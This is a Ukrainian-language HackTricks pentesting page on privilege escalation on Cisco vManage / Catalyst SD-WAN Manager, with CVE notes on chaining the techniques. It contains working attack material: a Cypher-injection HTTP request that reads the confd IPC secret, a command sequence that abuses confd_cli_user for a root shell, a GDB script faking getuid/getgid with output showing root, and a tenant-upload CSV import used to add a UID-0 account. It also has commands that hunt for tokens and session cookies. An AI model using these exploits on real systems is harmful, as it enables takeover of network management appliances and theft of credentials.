# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Після отримання code execution на Cisco vManage / *Catalyst SD-WAN Manager* від імені `vmanage`, `netadmin` або `vmanage-admin` найцікавішими локальними поверхнями для privesc зазвичай є стек CLI `confd`, helper `cmdptywrapper`, localhost REST APIs та обробники імпорту/завантаження, що належать root.

Якщо вам усе ще потрібен **initial foothold** на controller, спершу перегляньте окрему сторінку control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Швидка локальна перевірка
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Якщо `/etc/confd/confd_ipc_secret` доступний для читання з вашого foothold, Path 1 і Path 2 стають одразу практичними. Якщо ви отримали доступ через remote info leak або webshell, також перевірте, чи можете ви вже отримати доступ до SSH-матеріалів `vmanage-admin` або multitenancy upload handlers: дослідження 2026 року показало, що обидва варіанти були реалістичними проміжними етапами.

## Path 1

(Приклад із [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Після нетривалого дослідження [документації](http://66.218.245.39/doc/html/rn03re18.html), пов’язаної з `confd` і різними бінарними файлами (доступними за наявності облікового запису на вебсайті Cisco), ми виявили, що для автентифікації IPC-сокета використовується секрет, розташований у `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Пам’ятаєте наш екземпляр Neo4j? Він працює з привілеями користувача `vmanage`, що дає змогу отримати файл, використовуючи попередню вразливість:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Тож ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` із власним набором аргументів. Однак із поточними привілеями він недоступний для читання, тому нам потрібно отримати його з rootfs і скопіювати за допомогою scp, переглянути довідку та використати її для отримання shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Шлях 2

(Приклад із [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

У блозі¹ команда synacktiv описала елегантний спосіб отримати root shell, але є нюанс: для цього потрібно отримати копію `/usr/bin/confd_cli_user`, доступну для читання лише root. Я знайшов інший спосіб підвищити привілеї до root без таких складнощів.

Під час дизасемблювання бінарного файлу `/usr/bin/confd_cli` я помітив таке:

<details>
<summary>Objdump, що демонструє отримання UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Коли я виконую “ps aux”, я помітив наступне (_примітка: -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, отримані від користувача, який увійшов у систему, застосунку “cmdptywrapper”.

Спочатку я спробував запустити “cmdptywrapper” безпосередньо, передавши йому `-g 0 -u 0`, але це не спрацювало. Схоже, десь у процесі створюється файловий дескриптор (-i 1015), і я не можу його підробити.

Як зазначено в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу впливати на неї за допомогою debugger, і, на щастя, GDB входить до складу системи.

Я створив GDB-скрипт, у якому змусив API `getuid` і `getgid` повертати 0. Оскільки через deserialization RCE я вже маю привілей “vmanage”, то маю дозвіл безпосередньо прочитати `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Вивід консолі:

<details>
<summary>Вивід консолі</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Шлях 3 (помилка перевірки вхідних даних CLI 2025 року — CVE-2025-20122)

Пізніше Cisco описала чистіший локальний шлях до root у власному advisory для [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **автентифікований attacker лише з read-only privileges** міг надіслати спеціально сформований запит до manager CLI та отримати root через недостатню перевірку вхідних даних.

З offensive perspective, важливі такі висновки:

1. Щойно ви отримали *будь-яке low-priv foothold на системі, слід перевірити локальний CLI service, перш ніж переходити до складнішого workflow Path 1 / Path 2.
2. Повторно використовуйте artifacts із Path 2, щоб знайти trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Вважайте підозрілим кожне поле, яке передається до CLI backend: UID/GID, username, terminal metadata, imported files або будь-яке значення, яке згодом використовує helper, що працює від root.
4. Якщо low-priv user може отримати доступ до локального CLI socket і впливати на ці поля, до root може бути лише один crafted request.

Практичний workflow після отримання доступу до appliance:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Це перетворює баг 2025 року на корисний hunting pattern для подібних версій: шукайте **локальні CLI shims, які збирають ідентифікаційні дані в userland і передають їх привілейованій wrapper-програмі**.

Не плутайте **CVE-2025-20122** з пізнішою **CVE-2026-20122**: проблема 2025 року — це *локальний* баг CLI-to-root, тоді як проблема 2026 року — це *віддалене* довільне перезаписування файлів через API, яке переважно корисне для встановлення foothold із подальшим поверненням до Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

У рекомендаціях Cisco за лютий 2026 року також було представлено ще один корисний клас privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) дозволяла **автентифікованому локальному attacker з низькими привілеями** отримати root через недостатній механізм автентифікації користувачів у REST API.

Це важливо, оскільки privesc у vManage більше не обмежується зловживанням `confd`/TTY. Отримавши shell із низькими привілеями, також шукайте:

- API endpoints, доступні лише через localhost, які надмірно довіряють caller
- tokens, cookies або service credentials, доступні для читання поточному акаунту
- дії, доступні лише root, відкриті через `dataservice`/REST handlers, які все ще можна локально викликати

На практиці, отримавши shell від імені `vmanage` або іншого service user, зловживання локальним API часто є менш помітним і його простіше автоматизувати, ніж інтерактивне зловживання CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Якщо контекст локальної сесії достатній для доступу до привілейованої REST-функціональності, надавайте перевагу шляху через API: його легше відтворювати, автоматизувати за допомогою скриптів і поєднувати з викраденими веб-сесіями або API-токенами.

## Шлях 5 (файл, створений у 2026 році, оброблений root - CVE-2026-20245)

Ще один нещодавній приклад — [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): локальний зловмисник із привілеями `netadmin` міг завантажити **спеціально створений файл**, який CLI згодом небезпечно обробляв, що призводило до ін'єкції команд із правами `root`.

З погляду HackTricks, цінною є техніка, ширша за конкретну CVE:

1. Перелічіть усі CLI або вебпроцеси, які приймають файли: імпорти, діагностичні пакети, шаблони, валідатори, резервні копії, дані tenant тощо.
2. Відстежте, куди потрапляє завантажений файл і який скрипт або бінарний файл, що належить root, його обробляє.
3. Перевірте, чи передаються ім'я файлу, його вміст або розібрані метадані до shell-команд, wrapper-скриптів або допоміжних функцій на кшталт `system()`.
4. Якщо ви вже можете отримати доступ до `netadmin` (дійсні облікові дані, викрадена сесія або ланцюжок обходу автентифікації), уразливості обробки файлів часто є найшвидшим шляхом до root.

Пізніше Google Cloud / Mandiant продемонстрували цілком конкретний випадок експлуатації цього класу помилок через шлях імпорту multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
У спостережуваній атаці спеціально сформований CSV зрештою змінив `/etc/passwd` і `/etc/shadow`, щоб створити тимчасовий обліковий запис із UID 0 (`troot`). Це робить імпортери на кшталт `tenant-upload` / `tenant-list` особливо цікавими: це не просто функції приймання даних, а потенційні front-end'и парсерів, що працюють із правами root.

Швидкий шаблон пошуку на рівні shell має такий вигляд:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Цей клас багів особливо добре ланцюжиться з remote footholds, які надають `netadmin`, але не `root`.

## Інші нещодавні вразливості vManage/Catalyst SD-WAN Manager для ланцюжка

- **Неавтентифікований info leak (CVE-2026-20133)** – Особливо цінний, оскільки публічне дослідження показало, що він може розкрити `confd_ipc_secret` або приватний ключ `vmanage-admin`, перетворюючи bug читання на Path 1 або NETCONF pivot.
- **Автентифіковане довільне перезаписування файлів через API (CVE-2026-20122)** – Відрізняється від описаного вище CLI bug 2025 року; VulnCheck використав його для завантаження webshell, що робить локальні privesc paths на цій сторінці одразу релевантними.
- **Автентифікований XSS в UI (CVE-2024-20475)** – Викрасти admin session у web UI, а потім виконувати pivot до API/CLI actions, які зрештою приводять до `vshell` або одного з описаних вище локальних privesc paths.
- **Remote auth bypass до `netadmin` (CVE-2026-20129)** – Дуже сильний precursor для Path 5, оскільки `netadmin` – саме той рівень, який потрібен для crafted-file privesc 2026 року.
- **Автентифікований довільний запис файлів (CVE-2026-20262)** – Має подібну offensive value до CVE-2026-20122, але працює через пізніший upload path у web UI: записати дані в location, який згодом буде оброблений `root` або web tier management plane.
- **Downgrade для відновлення старого CLI privesc (CVE-2022-20775)** – Інциденти 2026 року показали, що attackers можуть виконати rollback до старішої вразливої SD-WAN build, використати старий CLI root bug, а потім відновити початкову версію.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Детальніше описаний на спеціальній сторінці SD-WAN control-plane; він може додати SSH key для `vmanage-admin`, надаючи локальний foothold, необхідний для повторного використання цієї сторінки.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
